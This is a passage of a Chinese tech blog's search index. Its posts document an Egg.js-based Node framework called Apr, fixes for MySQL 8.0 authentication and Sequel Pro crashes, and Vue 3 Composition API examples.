\u0026#34;^3.13.1\u0026#34; }, \u0026#34;scripts\u0026#34;: { \u0026#34;dev\u0026#34;: \u0026#34;egg-bin dev\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;egg-bin test\u0026#34; }, \u0026#34;egg\u0026#34;: { \u0026#34;framework\u0026#34;: \u0026#34;@lianpf/apr\u0026#34; } } 4. 搭建: controller、service、configs、router.js、views 参考以下结构，搭建文件\napr-example ├── app │ ├── controller │ │ └── home.js │ ├── public │ ├── router.js │ ├── service │ │ └── code.js │ └── view │ └── home.tpl ├── config │ ├── config.default.js │ └── plugin.js ├── logs │ └── apr-example │ ├── apr-example-web.log │ ├── common-error.log │ ├── egg-agent.log │ ├── egg-schedule.log │ └── egg-web.log ├── package-lock.json ├── package.json ├── run │ ├── agent_config.json │ ├── agent_config_meta.json │ ├── agent_timing_57111.json │ ├── application_config.json │ ├── application_config_meta.json │ ├── application_timing_57112.json │ └── router.json └── test └── app └── controller └── home.test.js (1) router.js app/router.js 示例:\nuse strict\u0026#39;; module.exports = app =\u0026gt; { app.router.get(\u0026#39;/\u0026#39;, app.controller.home.index); }; (2) controller app/controller/home.js 示例:\n\u0026#39;use strict\u0026#39;; // 引入框架 const Controller = require(\u0026#39;@lianpf/apr\u0026#39;).Controller; class HomeController extends Controller { async index() { const ctx = this.ctx; // use service defined in framework const data = await ctx.service.test.get(123); const result = await ctx.service.code.storageCustomCode(); await ctx.render(\u0026#39;home.tpl\u0026#39;, Object.assign({}, data, result)); } } module.exports = HomeController; (3) service app/service/code.js 示例:\nconst Service = require(\u0026#39;@lianpf/apr\u0026#39;).Service; class CodeService extends Service { async storageCustomCode() { // 连接db获取用户数据 const result = await this.app.mysql.get(\u0026#39;custom_code\u0026#39;, { id: 11 }); // console.log(\u0026#39;--storageCustomCode-result--\u0026#39;, result) return result; } } module.exports = CodeService; (4) 其他文件 views public configs \u0026hellip; 请直接参考demo 源码，欢迎 star。\n二、API介绍及示例 1. mysql 配置app/config/config.default.js 配置app/config/plugin.js app/service/code.js 使用 app/config/config.default.js 配置mysql信息\n/** * @param {Egg.EggAppInfo} appInfo app info */ module.exports = appInfo =\u0026gt; { /** * built-in config * @type {Egg.EggAppConfig} **/ const config = exports = {}; // 用于cookie签名密钥，应更改为你自己的 Cookie 安全字符串 config.keys = appInfo.name + \u0026#39;_1617081780536_9800\u0026#39;; config.mysql = { // 单数据库信息配置 client: { // host host: \u0026#39;127.0.0.1\u0026#39;, // 端口号 port: \u0026#39;3306\u0026#39;, // 用户名 user: \u0026#39;root\u0026#39;, // 密码 password: \u0026#39;12345678\u0026#39;, // 数据库名 database: \u0026#39;localTestDB\u0026#39;, }, // 是否加载到 app 上，默认开启 app: true, // 是否加载到 agent 上，默认关闭 agent: false, }; // add your user config here const userConfig = { // myAppName: \u0026#39;egg\u0026#39;, }; return { ...config, ...userConfig, }; }; app/config/plugin.js 开启mysql插件\nmodule.exports = { // 开启插件 mysql: true, nunjucks: true, } 使用详见 app/service/code.js 源码示例。\n2. nunjucks 配置app/config/plugin.js app/controller/home.js 使用 app/config/plugin.js 开启nunjucks插件\nmodule.exports = { // 开启插件 mysql: true, nunjucks: true, } 使用详见 app/controller/home.js 源码示例。\n3. 其他 待补充\u0026hellip;\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-aprframework-docs/","summary":"\u003cp\u003e整个团队依赖初版Apr作为统一的Node方案，随着业务场景越来越丰富，一些插件、middle等公共配置成为最佳实践后，逐渐下沉到Apr框架中，让Apr越来越\u0026hellip;\u003c/p\u003e","title":"Node: Apr框架使用文档"},{"content":"在低代码平台开发过程，由于物料管理系统以及Node Server 中间层的搭建使用过程中，发现很多通用的库和配置可以\u0026hellip;\n一、背景 在低代码平台开发过程，由于物料管理系统以及Node Server 中间层的搭建使用过程中，发现很多通用的库和配置可以沉淀，形成可复制的解决方案。所以，基于开源框架Egg.js（基于Koa2）进行了拓展封装形成了初版Apr。\n整个团队依赖初版Apr作为统一的Node方案，随着业务场景越来越丰富，一些插件、middle等公共配置成为最佳实践后，逐渐下沉到Apr框架中，让Apr越来越成熟。而后，依赖Apr的其他项目仅需简单的升级下框架的版本即可享受到Apr带来的红利。\n如果你的团队也在考虑搭建类似的框架，那么请考虑如下问题：\n如果你的团队遇到过： 维护很多个项目，每个项目都需要复制拷贝诸如 gulpfile.js / webpack.config.js 之类的文件 每个项目都需要使用一些相同的类库，相同的配置 在新项目中对上面的配置做了一个优化后，如何同步到其他项目？ 如果你的团队需要： 统一的技术选型，比如数据库、模板、前端框架及各种中间件设施都需要选型，而框架封装后保证应用使用一套架构 统一的默认配置，开源社区的配置可能不适用于公司，而又不希望应用去配置 统一的部署方案，通过框架和平台的双向控制，应用只需要关注自己的代码，具体查看应用部署 统一的代码风格，框架不仅仅解决代码重用问题，还可以对应用做一定约束，作为企业框架是很必要的。Apr依赖于 Egg, Egg 在 Koa 基础上做了很多约定，框架可以使用 Loader 自己定义代码规则 如果需要，以下是Apr的简易版搭建过程，也许对你有所帮助:\n稳定成熟版涉及到公司相关业务，故仅存内网中，不对外暴露，请勿私聊获取\n二、框架与多进程 框架的扩展是和多进程模型有关的，我们已经知道多进程模型，我们需要扩展的类有 Agent 和 Application。\n在 Agent Worker 启动的时候会实例化 Agent，而在 App Worker 启动时会实例化 Application，这两个类又同时继承 EggCore。\nEggCore 可以看做 Koa Application 的升级版，默认内置 Loader、Router 及应用异步启动等功能，可以看做是支持 Loader 的 Koa。 而我们要搭建的Apr则依赖于EggCore。\nKoa Application ^ EggCore ^ AprCore ^ ┌──────┴───────┐ │ │ Apr Agent Apr Application ^ ^ agent worker app worker 三、定制框架: Apr 1. create Apr \u0026amp; init $ mkdir apr \u0026amp;\u0026amp; cd apr $ npm init egg --type=framework $ npm i $ npm test 2. 框架继承 框架支持继承关系，可以把框架比作一个类，基类是 Egg 框架，定义一个框架需要继承于Egg且实现 Egg 所有的 API。\n// package.json { \u0026#34;name\u0026#34;: \u0026#34;apr\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;egg\u0026#34;: \u0026#34;^2.0.0\u0026#34; } } // index.js module.exports = require(\u0026#39;./lib/framework.js\u0026#39;); // lib/framework.js const path = require(\u0026#39;path\u0026#39;); const egg = require(\u0026#39;egg\u0026#39;); const EGG_PATH = Symbol.for(\u0026#39;egg#eggPath\u0026#39;); class Application extends egg.Application { get [EGG_PATH]() { // 返回 framework 路径 return path.dirname(__dirname); } } // 覆盖了 Egg 的 Application module.exports = Object.assign(egg, { Application, }); 应用启动时需要指定框架名（在 package.json 指定 egg.framework，默认为 egg），Loader 将从 node_modules 找指定模块作为框架，并加载其 export 的 Application\n{ \u0026#34;scripts\u0026#34;: { \u0026#34;dev\u0026#34;: \u0026#34;egg-bin dev\u0026#34; }, \u0026#34;egg\u0026#34;: { \u0026#34;framework\u0026#34;: \u0026#34;apr\u0026#34; } } 现在 apr 框架目录已经是一个 loadUnit，那么相应目录和文件（如 app 和 config）都会被加载\n3. 自定义 Agent 上面的例子自定义了 Application，因为 Egg 是多进程模型，所以还需要定义 Agent，原理是一样的\n// lib/framework.js const path = require(\u0026#39;path\u0026#39;); const egg = require(\u0026#39;egg\u0026#39;); const EGG_PATH = Symbol.for(\u0026#39;egg#eggPath\u0026#39;); class Application extends egg.Application { get [EGG_PATH]() { // 返回 framework 路径 return path.dirname(__dirname); } } class Agent extends egg.Agent { get [EGG_PATH]() { return path.dirname(__dirname); } } // 覆盖了 Egg 的 Application module.exports = Object.assign(egg, { Application, Agent, }); 但因为 Agent 和 Application 是两个实例，所以 API 有可能不一致\n4. 自定义 Loader Loader 应用启动的核心，使用它还能规范应用代码，我们可以基于这个类扩展更多功能，比如加载数据代码。\n扩展 Loader 还能覆盖默认的实现，或调整现有的加载顺序等\n自定义 Loader 也是用 Symbol.for(\u0026rsquo;egg#loader\u0026rsquo;) 的方式，主要的原因还是使用原型链\n// lib/framework.js const path = require(\u0026#39;path\u0026#39;); const egg = require(\u0026#39;egg\u0026#39;); const EGG_PATH = Symbol.for(\u0026#39;egg#eggPath\u0026#39;); class AppWorkerLoader extends egg.AppWorkerLoader { load() { super.load(); // 自己扩展 } } class Application extends egg.Application { get [EGG_PATH]() { // 返回 framework 路径 return path.dirname(__dirname); } // 覆盖 Egg 的 Loader，启动时使用这个 Loader get [EGG_LOADER]() { return AppWorkerLoader; } } // 覆盖了 Egg 的 Application module.exports = Object.assign(egg, { Application, // 自定义的 Loader 也需要 export，上层框架需要基于这个扩展 AppWorkerLoader: AppWorkerLoader, }); AgentWorkerLoader 扩展也类似，这里不再举例\nAgentWorkerLoader 加载的文件可以于 AppWorkerLoader 不同，比如：默认加载时，Egg 的 AppWorkerLoader 会加载 app.js 而 AgentWorkerLoader 加载的是 agent.js。\n5. 拓展其他功能 你还可以自己去丰富plugins、middle等各种各样的功能特效，让你的Apr功能变得变得越来越强大，此处以plugins为例。\n内置 nunjucks 来提供服务端模板渲染能力 封装 egg-mysql // Apr 框架配置 // package.json { \u0026#34;name\u0026#34;: \u0026#34;apr\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;egg-mysql\u0026#34;: \u0026#34;^3.0.0\u0026#34;, \u0026#34;egg-view-nunjucks\u0026#34;: \u0026#34;^2.0.0\u0026#34; } } // config/plugin.js /** * @desc: framework 集成各种 plugins * @path: \u0026#39;config/plugin.js\u0026#39; * */ module.exports = { // mysql mysql: { enable: false, package: \u0026#39;egg-mysql\u0026#39;, }, // add you build-in plugin here, example: nunjucks: { enable: false, package: \u0026#39;egg-view-nunjucks\u0026#39;, } } 使用Apr的应用配置:\n// 应用配置 // package.json { \u0026#34;dependencies\u0026#34;: { \u0026#34;apr\u0026#34;: \u0026#34;^1.0.0\u0026#34;, } } // config/plugin.js module.exports = { // 开启插件 mysql: true, nunjucks: true, } 在框架的基础上还可以扩展出新的框架，也就是说框架是可以无限级继承的，有点像类的继承\n+-----------------------------------+--------+ | app1, app2, app3, app4 | | +-----+--------------+--------------+ | | | | framework2 | | + | Apr +--------------+ plugin | | | | framework1 | | + +--------------+--------------+ | | Egg | | +-----------------------------------+--------| | Koa | +-----------------------------------+--------+ 四、单元测试 待补充\u0026hellip;\n可 参考\n五、框架启动原理 startCluster 启动传入 baseDir 和 framework，Master 进程启动 Master 先 fork Agent Worker 根据 framework 找到框架目录，实例化该框架的 Agent 类 Agent 找到定义的 AgentWorkerLoader，开始进行加载 AgentWorkerLoader，开始进行加载 整个加载过程是同步的，按 plugin \u0026gt; config \u0026gt; extend \u0026gt; agent.js \u0026gt; 其他文件顺序加载 agent.js 可自定义初始化，支持异步启动，如果定义了 beforeStart 会等待执行完成之后通知 Master 启动完成。 Master 得到 Agent Worker 启动成功的消息，使用 cluster fork App Worker App Worker 有多个进程，所以这几个进程是并行启动的，但执行逻辑是一致的 单个 App Worker 和 Agent 类似，通过 framework 找到框架目录，实例化该框架的 Application 类 Application 找到 AppWorkerLoader，开始进行加载，顺序也是类似的，会异步等待，完成后通知 Master 启动完成 Master 等待多个 App Worker 的成功消息后启动完成，能对外提供服务 六、Apr结构 Apr ├── README.md ├── app │ ├── extend │ │ ├── application.js │ │ └── context.js │ └── service │ └── test.js ├── config │ ├── config.default.js │ └── plugin.js ├── index.js ├── lib │ └── framework.js ├── package-lock.json ├── package.json └── test ├── fixtures │ └── example │ ├── app │ │ ├── controller │ │ │ └── home.js │ │ └── router.js │ ├── config │ │ └── config.default.js │ └── package.json └── framework.test.js 引用示例 demo源码仓库，欢迎 star。\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-aprframework-develop/","summary":"\u003cp\u003e在低代码平台开发过程，由于物料管理系统以及Node Server 中间层的搭建使用过程中，发现很多通用的库和配置可以\u0026hellip;\u003c/p\u003e","title":"Node: Apr框架开发"},{"content":"开发项目电脑中装上了mysql8.0数据库，在使用数据库时遇见未知的意外错误，下面来记录下问题解决的过程\u0026hellip;\n一、Node.js mysql 1、Node.js mysql客户端不支持认证协议 问题描述: 解决Node.js mysql客户端不支持认证协议引发的“ER_NOT_SUPPORTED_AUTH_MODE”问题\n问题原因:\nNode最新的mysql模块并未完全支持MySQL 8的“caching_sha2_password”加密方式 “caching_sha2_password”在MySQL 8中是默认的加密方式 因此，在你初始化 MYSQL 8.0 使用 validate_password_policy 安全设置向导，(默认)选择的 MIDDLE 级别的加密方式。但是node的mysql模块仅支持 LOW级别，所以该账号、密码无法在mysql模块中使用\n问题解决：\n修改用户root的密码，并指定mysql模块能够支持的加密方式\n~\u0026gt; mysql -u root -p mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;validate_password%\u0026#39;; mysql\u0026gt; set global validate_password.policy=0; mysql\u0026gt; ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;8位密码\u0026#39;; 二、Sequel Pro 在选用数据库可视化工具来连接数据库时遇见未知的意外错误\n1、解决MAC:Sequel Pro encountered an unexpected error 问题 问题描述：连接出现Sequel Pro encountered an unexpected error\n问题描述\n博主配置环境\nthe latest version of mac os Mojave 10.14 mysql 8.0 下载的最新Sequel Pro 1.1.2 ，连接上数据库 mysql 8.0，每次选中左上角的数据库表时，选库，选表就报错，就出现了上边的情况\n问题解决:\n首先尝试重装，怀疑安装Sequel Pro 时少了什么东西，问题依旧。 换用 Sequel Pro 1.1.1 还是出现同样问题。排除Sequel Pro版本问题 mac os 版本或者数据库版本问题 针对第三种情况，进行查找，查到: 对于 MySQL 8.0及以上来说，目前发布的版本1.1.2连接的时候可能会崩溃退出。\n看下官方的解释：\nFixed 100% working. Previously Sequel pro had problems with the latest version of mac os Mojave 10.14 and mysql 8.0, to ensure sequel pro works fine during the whole process of development you need to download Sequel pro Test build version here: https://sequelpro.com/test-builds\n遇见这种mysql版本的问题，也没有什么好的办法，使用test build版本就好了。\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/db-mysql-gui/","summary":"\u003cp\u003e开发项目电脑中装上了mysql8.0数据库，在使用数据库时遇见未知的意外错误，下面来记录下问题解决的过程\u0026hellip;\u003c/p\u003e","title":"MySQL 8.0问题排查"},{"content":"本文是vue3+ts项目系列第3篇《vue3组合式api及重要属性变更》，会\u0026hellip;\n一、前言 在 react 和 vue 社区中也越来越多人开始使用TypeScript，使用 TS 可以增加代码的可读性和可维护性。从发布的 Vue3 正式版本来看， Vue3 的源码是用 TS 编写的，更好的 TypeScript 支持也是这次升级的一大亮点。当然，在实际开发中如何正确拥抱 TS 以及如何迁移到 Vue3 也是项目中我们不得不面对的问题，这里针对 Vue3 和 TS单独做了一个系列和大家做一下交流，本篇是 vue3+ts项目系列3篇《vue3组合式api及重要属性变更》。\n本系列其他内容如下:\nvue3+ts项目系列第1篇《vue3项目从0到1搭建》 vue3+ts项目系列第2篇《TypeScript 语法汇总》 vue3+ts项目系列第3篇《vue3组合式api及重要属性变更》 二、背景 Vue作为一种渐进式框架， 借鉴了 React 的组件化和虚拟 DOM、Angular 的模块化和双向数据绑定。随着 Vue 3 内核 API 与实现已趋稳定， 可以看到相对vue2.x，Vue3做了很多重要的变更，特别是Composition API的引入。\n3.0 对比 2.x 的重要变更有 6 个方面：\nPerformance（性能）: 优化了虚拟 DOM，有了更加优化的编译，实现了更加高效的组件初始化 Rewritten virtual dom implementation （重写了虚拟 DOM） Compiler-informed fast paths （优化编译）、 More efficient component initialization （更高效的组件初始化） 1.3-2x better update performance （1.3~2 倍的更新性能） 2-3x faster SSR （2~3 倍的 SSR 速度） Tree-shaking support （支持 Tree-shaking）: 按需求引用的内置的指令和方法 All runtime features included: 22.5kb. More features but still lighter than Vue 2。大多数可选功能（如 v-model、）现在都是支持 Tree-shaking 的 Bare-bone HelloWorld size: 13.5kb. 11.75kb with only Composition API support All runtime features included: 22.5kb. More features but still lighter than Vue 2 Composition API Usable alongside existing Options API （可与现有选项 API 一起使用） Flexible logic composition and reuse （灵活的逻辑组成和重用） Reactivity module can be used as a standalone library （Reactivity 模块可以作为独立的库使用） Fragment, Teleport, Suspense Fragment: vue2时，由于组件必须只有一个根节点，很多时候会添加一些没有意义的节点用于包裹。Fragment组件就是用于解决这个问题的 Teleport其实就是React中的Portal，提供一种将子节点渲染到存在于父组件以外的 DOM 节点的优秀的方案 和React中的Supense是一样的。Suspense 让你的组件在渲染之前进行“等待”，并在等待时显示 fallback 的内容 Better TypeScript support （更好的 TypeScript 支持度） Custom Renderer API （自定义的 Renderer API） 本文主要接下来主要涉及到的内容为 Custom Renderer API。\n三、Composition API 等核心特性 核心关注点:\nsetup reactive ref引用 \u0026amp; toRefs Lifecycle Hooks computed watch 依赖注入 provide \u0026amp; inject 1、setup setup() 函数是 vue3 中，专门为组件提供的新属性。它为我们使用 vue3 的 Composition API 新特性提供了统一的入口。\nsetup 函数相当于 vue2.x 中 beforeCreate 和 created, 在 beforeCreate 之后、created 之前执行 setup第一个形参，接收 props 数据 setup第二个形参是一个上下文对象, 在 setup() 函数中无法访问到 this, 可以用这个context来访问 Tips:\nsetup 第一个参数接受一个响应式的props，这个props指向的是外部的props。如果你没有定义props选项，setup中的第一个参数将为undifined。遵循vue2.x的原则\nprops 定义 不要在子组件中修改props；如果你尝试修改，将会给你警告甚至报错 不要解构props。解构的props会失去响应性 示例：\nimport { inject, defineComponent } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;ListItem\u0026#34;, props: { data: Object }, steup({data}) { console.log(\u0026#34;--userData--\u0026#34;, data); return { data }; } }); 2、reactive reactive() 函数接收一个普通对象，返回一个响应式的数据对象。\n示例：\nimport { defineComponent, onUnmounted, reactive, ref, watchEffect } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;About\u0026#34;, components: {}, setup() { const state = reactive({ msg: \u0026#39;欢迎来到 \u0026#34;关于 vue3 和TS的语法DEMO\u0026#34;\u0026#39;, testWatchEffectCount: 0 }); // watchEffect —— 1.自动收集数据源作为依赖、2.只有变更后的值、3.默认会执行一次寻找依赖，然后属性改变也会执行 const count = ref(0); watchEffect(() =\u0026gt; { console.log(\u0026#34;--watchEffect-value--\u0026#34;, count.value); state.testWatchEffectCount = count.value; }); setInterval(() =\u0026gt; { count.value++; }, 500); const stop = watchEffect(() =\u0026gt; { console.log(\u0026#34;--stop-effect--\u0026#34;); }); // 清除副作用 watchEffect(onInvalidate =\u0026gt; { console.log(count.value, \u0026#34;0-副作用\u0026#34;); const token = setTimeout(() =\u0026gt; { console.log(count.value, \u0026#34;1-副作用\u0026#34;); }, 5000); onInvalidate(() =\u0026gt; { // count(watchEffect函数依赖项) 改变时或停止侦听时，取消之前的异步操作 token.cancel(); }); }); onUnmounted(() =\u0026gt; { stop(); }); return { state }; } }); \u0026lt;/script\u0026gt; 3、ref引用 \u0026amp; toRefs ref常用于基本类型，reactive用于引用类型。如果ref传入对象，其实内部会自动变为reactive\nref() 函数根据给定的值创建一个响应式的数据对象，返回值是一个对象，这个对象上只包含一个 .value 属性 toRefs() 函数可以将 reactive() 创建出来的响应式对象，转换为普通的对象，只不过，这个对象上的每个属性节点，都是 ref() 类型的响应式数据 通过 ref() 还可以引用页面上的元素或组件，和vue2的ref概念类似 元素引用 组件引用 示例：父组件\nimport { ref, reactive, toRefs, onMounted } from \u0026#39;vue\u0026#39; export default { setup() { const count = ref(0) // 创建响应式数据对象 count，初始值为 0 console.log(count.value) // 在setup内访问count值需要.value 属性才可以，但在template中可以直接访问 const state = reactive({count: 0, name:\u0026#39;weedsFly\u0026#39;}) // 用reactive集中创建多个响应式对象 const add = () =\u0026gt; { // methods写在setup内 state.count++ } // 元素引用 const h1Ref = ref(null) // 创建一个 DOM 引用 onMounted(() =\u0026gt; { // 在 DOM 首次加载完毕之后，才能获取到元素的引用 h1Ref.value.style.color = \u0026#39;pink\u0026#39; // h1Ref.value 是原生DOM对象 }) // 组件引用 const compRef = ref(null) // 创建一个组件的 ref 引用 showCompData = () =\u0026gt; { // 展示子组件中 count 的值 console.log(compRef.value.count) } return { count, // ...state, // 使用展开运算符后 用reactive创建的响应式数据 变成了 固定的值 ...toRefs(state), // 可以用toRefs函数 将传进来的非响应式对象 转成 ref() 类型的响应式数据 add, h1Ref, compRef, showCompData } }, } 示例：子组件\nimport { ref } from \u0026#39;vue\u0026#39; export default { setup() { const count = ref(0) // 定义响应式的数据 return { count } } } 4、Lifecycle Hooks 新版的生命周期函数，可以按需导入到组件中，且只能在 setup() 函数中使用\nuse setup() beforeCreate created onBeforeMount \u0026lt;- beforeMount onMounted \u0026lt;- mounted onBeforeUpdate \u0026lt;- beforeUpdate onUpdated \u0026lt;- updated onBeforeUnmount \u0026lt;- beforeDestroy onUnmounted \u0026lt;- destroyed onErrorCaptured \u0026lt;- errorCaptured Tips:\n无法设置 reactive的state\n示例：\nimport { defineComponent, onUnmounted, reactive, ref, watchEffect } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;About\u0026#34;, components: {}, setup() { const state = reactive({ msg: \u0026#39;欢迎来到 \u0026#34;关于 vue3 和TS的语法DEMO\u0026#34;\u0026#39;, testWatchEffectCount: 0 }); // watchEffect —— 1.自动收集数据源作为依赖、2.只有变更后的值、3.默认会执行一次寻找依赖，然后属性改变也会执行 const count = ref(0); watchEffect(() =\u0026gt; { console.log(\u0026#34;--watchEffect-value--\u0026#34;, count.value); state.testWatchEffectCount = count.value; }); setInterval(() =\u0026gt; { count.value++; }, 500); const stop = watchEffect(() =\u0026gt; { console.log(\u0026#34;--stop-effect--\u0026#34;); }); // 清除副作用 watchEffect(onInvalidate =\u0026gt; { console.log(count.value, \u0026#34;0-副作用\u0026#34;); const token = setTimeout(() =\u0026gt; { console.log(count.value, \u0026#34;1-副作用\u0026#34;); }, 5000); onInvalidate(() =\u0026gt; { // count(watchEffect函数依赖项) 改变时或停止侦听时，取消之前的异步操作 token.cancel(); }); }); onUnmounted(() =\u0026gt; { stop(); }); return { state }; } }); 5、computed computed() 用来创建计算属性，computed() 函数的返回值是一个 ref 的实例\ncomputed创建只读的计算属性(传入一个 function 函数，可以得到一个只读的计算属性) computed创建可读可写的计算属性 示例:\nimport { ref, computed } from \u0026#39;vue\u0026#39; export default { setup() { const count = ref(0) const computedCount = computed(() =\u0026gt; count.value + 1) computedCount.value = 9 // computed value is readonly. const count2 = ref(0) const computedCount2 = computed({ get: () =\u0026gt; count2.value + 1, set: val =\u0026gt; { count2.value = val - 1 } }) computedCount2.value = 100 // 为计算属性赋值的操作，会触发 set 函数 console.log(count2.value) // 触发 set 函数后，count 的值会被更新 return { count, computedCount, count2, computedCount2 } }, } 6、watch 监视单个数据源变动 监视单个reactive创建的数据 监视单个ref创建的数据源 监视多个数据源 监视多个reactive创建的数据源 监视多个ref创建的数据源 清除watch监视 在 watch 中清除无效的异步任务（与节流防抖同效） 示例:\nimport { reactive, ref, watch } from \u0026#39;vue\u0026#39; export default { setup() { // 1-1 监视单个reactive创建的数据源 const state = reactive({count: 100}) watch( () =\u0026gt; state.count, (newVal, oldVal) =\u0026gt; { console.log(newVal, oldVal)}, {lazy: true} // 在 watch 被创建的时候，不执行回调函数中的代码 ) // 1-2 监视单个ref创建的数据源 const count2 = ref(100) const stop2 = watch( count2, (newVal, oldVal) =\u0026gt; { console.log(newVal, oldVal)}, {lazy: true} // 在 watch 被创建的时候，不执行回调函数中的代码 ) // 2-1 监视多个reactive创建的数据源 const state3 = reactive({count: 100, name: \u0026#39;Laiyj\u0026#39;}) watch( [() =\u0026gt; state3.count, () =\u0026gt; state3.name], ([newCount, newName], [oldCount, oldName]) =\u0026gt; { console.log(newCount, oldCount) console.log(newName, oldName) }, {lazy: true} // 在 watch 被创建的时候，不执行回调函数中的代码 ) // 2-2 监视多个ref创建的数据源 const count4 count = ref(100) const name4 = ref(\u0026#39;Fei\u0026#39;) watch( [count4, name4], ([newCount, newName], [oldCount, oldName]) =\u0026gt; { console.log(newCount, oldCount) console.log(newName, oldName) }, {lazy: true} // 在 watch 被创建的时候，不执行回调函数中的代码 ) setTimeout(() =\u0026gt; { state.count++; count2++; state2.count++; state2.name = \u0026#39;lian\u0026#39;; count4++; name4 = \u0026#39;lian4\u0026#39;; }, 500) } // 3、清除watch监视 const clearWatch = () =\u0026gt; { stop() } // 4、watch 中清除无效的异步任务（与节流防抖同效） const keyword6 = ref(\u0026#39;\u0026#39;) const asyncPrint = (val) =\u0026gt; { // 执行异步任务，并得到关闭异步任务的 timerId return setTimeout(() =\u0026gt; { console.log(val) }, 1000) } watch( keyword6, (newVal, oldVal, onClean) =\u0026gt; { const timeId = asyncPrint() onClean(() =\u0026gt; {clearTimeout(timeId)}) // 如果 watch 监听被重复执行了，则会先清除上次未完成的异步任务 } ) return { state, count2, state3, count4, name4 clearWatch, keyword6 } } 7、依赖注入 provide \u0026amp; inject provide() 和 inject() 可以实现嵌套组件之间的数据传递 只能在 setup() 函数中使用。 父级组件中使用 provide() 函数向下传递数据；子级组件中使用 inject() 获取上层传递过来的数据 Tips:\nsteup() 初始化，在brforeCreate 前后, 所以，对于动态组件，类似 list 内加载 list-item, item是无法拿到list provide的值的\n示例：父组件\nimport { defineComponent, reactive, computed, provide, readonly, ref, onMounted } from \u0026#34;vue\u0026#34;; import ListItem from \u0026#34;./components/ListItem.vue\u0026#34;; import TestInject from \u0026#34;./components/TestInject.vue\u0026#34;; interface ListByStatusData { page: number; pageSize: number; } interface MovieItem { id: string; name: string; desc: string; } export default defineComponent({ name: \u0026#34;List\u0026#34;, components: { ListItem, TestInject }, setup() { let list: Array\u0026lt;MovieItem\u0026gt; = []; /** * @name: reactive * @desc: 核心流程 * @author: lianpf * @date: 2021.03.06 * */ let state = reactive({ title: \u0026#34;List Page\u0026#34;, count: 0, total: 0, list, provideStatus: false }); const params = computed(() =\u0026gt; ({ count: state.count + 1 })); /** * @name: 异步请求函数 \u0026amp; 泛型函数 * @desc: 核心流程 * @author: lianpf * @date: 2021.03.06 * */ type FnType = (x: number, y: number) =\u0026gt; Promise\u0026lt;Array\u0026lt;MovieItem\u0026gt;\u0026gt;; const getInitList: FnType = (page, pageSize) =\u0026gt; { console.log(`--req-params-page:${page}-pageSize:${pageSize}--`); return new Promise((resolve, reject) =\u0026gt; { try { let res: Array\u0026lt;MovieItem\u0026gt; = [ { id: \u0026#34;100\u0026#34;, name: \u0026#34;list-item-001\u0026#34;, desc: \u0026#34;001-001-001-001\u0026#34; }, { id: \u0026#34;200\u0026#34;, name: \u0026#34;list-item-002\u0026#34;, desc: \u0026#34;002-002-002-002\u0026#34; }, { id: \u0026#34;300\u0026#34;, name: \u0026#34;list-item-003\u0026#34;, desc: \u0026#34;003-003-003-003\u0026#34; } ]; resolve(res); } catch (e) { reject(e); } }); }; // const tempList = () =\u0026gt; getInitList() let reqParams: ListByStatusData = { page: 1, pageSize: 10 }; // 异步流控制函数 const asyncFlow = async () =\u0026gt; { let resData = await getInitList(reqParams.page, reqParams.pageSize); state.count = 2; state.list = resData; list = resData; }; onMounted(async () =\u0026gt; { await asyncFlow(); }); /** * @name: 依赖注入 —— 父组件通过 provide 函数向子级组件共享数据（不限层级） * @desc: 核心功能 * @author: lianpf * @date: 2021.03.06 * */ const parentColor = ref(\u0026#34;salmon\u0026#34;); // provide(\u0026#39;要共享的数据名称\u0026#39;, 被共享的数据) provide(\u0026#34;themeColor\u0026#34;, readonly(parentColor)); const updateThemeColor = () =\u0026gt; { state.provideStatus = !state.provideStatus; parentColor.value = state.provideStatus ? \u0026#34;skyblue\u0026#34; : \u0026#34;salmon\u0026#34;; }; // 父组件 function update “注入”的值 provide(\u0026#34;updateThemeColor\u0026#34;, updateThemeColor); provide(\u0026#34;location\u0026#34;, \u0026#34;North Pole\u0026#34;); provide(\u0026#34;geolocation\u0026#34;, { longitude: 90, latitude: 135 }); return { state, params, list }; } }); \u0026lt;/script\u0026gt; 示例: 子组件\nimport { inject, defineComponent } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;TestInject\u0026#34;, setup() { /** * @name: 依赖注入 * @desc: 核心功能 —— 调用 inject 函数时，通过指定的数据名称，获取到父级共享的数据 * @author: lianpf * @date: 2021.03.06 * */ const userThemeColor = inject(\u0026#34;themeColor\u0026#34;); const updateThemeColor = inject(\u0026#34;updateThemeColor\u0026#34;); console.log(\u0026#34;--userThemeColor--\u0026#34;, userThemeColor); const userLocation = inject(\u0026#34;location\u0026#34;, \u0026#34;The Universe\u0026#34;); const userGeolocation = inject(\u0026#34;geolocation\u0026#34;); return { userThemeColor, updateThemeColor, userLocation, userGeolocation }; } }); \u0026lt;/script\u0026gt; 四、项目结构 ├── README.md ├── babel.config.js ├── package-lock.json ├── package.json ├── public │ ├── favicon.ico │ └── index.html ├── src │ ├── App.vue │ ├── assets │ │ ├── logo.png │ │ └── styles │ │ └── varible.styl │ ├── components │ │ ├── HeaderNav.vue │ │ └── HelloWorld.vue │ ├── main.ts │ ├── router │ │ └── 